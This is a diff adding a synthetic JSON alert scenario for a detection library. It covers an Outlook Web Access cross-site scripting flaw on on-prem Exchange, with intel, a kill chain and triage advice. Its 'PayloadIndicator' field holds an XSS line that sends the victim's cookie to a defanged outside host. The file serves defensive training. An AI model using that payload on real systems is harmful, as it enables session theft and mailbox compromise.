@@ -1,0 +1,55 @@
+{
+  "scenario": "cve_2026_42897_exchange",
+  "title": "CVE-2026-42897: crafted email triggering OWA XSS on on-prem Exchange",
+  "source": {
+    "telemetry": "Exchange Server IIS/OWA request log correlated with Defender for Endpoint browser telemetry",
+    "detection": "OWA request containing script payload in a rendered message context",
+    "provenance": "synthetic",
+    "provenance_note": "Reconstructed from the public CVE description and vendor advisory. No exploit code was obtained or run; the request shape below is illustrative of the described attack path, not a captured exploitation attempt."
+  },
+  "intel": {
+    "cve": "CVE-2026-42897",
+    "cvss": 8.1,
+    "status": "Actively exploited; added to CISA KEV 2026-05-15",
+    "disclosed": "2026-05-14",
+    "patched": "2026-06-09",
+    "affected": "Exchange Server 2016, 2019, Subscription Edition (on-premises only)",
+    "not_affected": "Exchange Online",
+    "summary": "A cross-site scripting flaw in Outlook Web Access. An attacker sends a crafted email; when the recipient opens it in OWA and certain interaction conditions are met, attacker-supplied JavaScript executes in the browser context of the authenticated mail session.",
+    "why_this_matters": "Execution happens inside an authenticated OWA session, so the script inherits the victim's mail context. Natural follow-on is silent inbox-rule creation or token theft -- which is why this pairs directly with the two BEC scenarios in this library.",
+    "observed_kill_chain": [
+      "Crafted email delivered to on-prem Exchange mailbox",
+      "Victim opens the message in Outlook Web Access",
+      "Attacker JavaScript executes in the authenticated session context",
+      "Follow-on: mail exfiltration, inbox rule creation, or session token theft"
+    ]
+  },
+  "mitre": {
+    "id": ["T1203", "T1059.007", "T1566.001"],
+    "tactic": ["Execution", "Initial Access"],
+    "technique": [
+      "Exploitation for Client Execution",
+      "Command and Scripting Interpreter: JavaScript",
+      "Phishing: Spearphishing Attachment"
+    ]
+  },
+  "timestamp": "2026-08-20T11:52:03.000+0000",
+  "alert": {
+    "level": 14,
+    "description": "Possible CVE-2026-42897 exploitation: script payload in OWA message render request",
+    "host": "EXCH01.corp-example.local",
+    "user": "CORP\\a.pearce",
+    "fields": {
+      "Product": "Microsoft Exchange Server 2019 CU14 (unpatched -- below the 2026-06-09 security update)",
+      "RequestPath": "/owa/service.svc?action=GetItem&ID=AAMkAD...",
+      "cs-method": "POST",
+      "sc-status": "200",
+      "PayloadIndicator": "<img src=x onerror=\"fetch('https://mail-verify-cdn[.]workers[.]dev/c?s='+document.cookie)\">",
+      "ClientIP": "203.0.113.44",
+      "SenderAddress": "billing@contoso-vendor-example[.]com",
+      "SenderAuth": "SPF=fail DKIM=none DMARC=fail",
+      "MessageSubject": "RE: Outstanding invoice 8841 -- payment confirmation required"
+    }
+  },
+  "analyst_note": "Check the Exchange build number first. If the server is past the 2026-06-09 update this is a failed attempt worth logging, not an incident. SPF fail plus DKIM none plus a financial subject line is the BEC pretext wrapper this CVE is being delivered inside."
+}
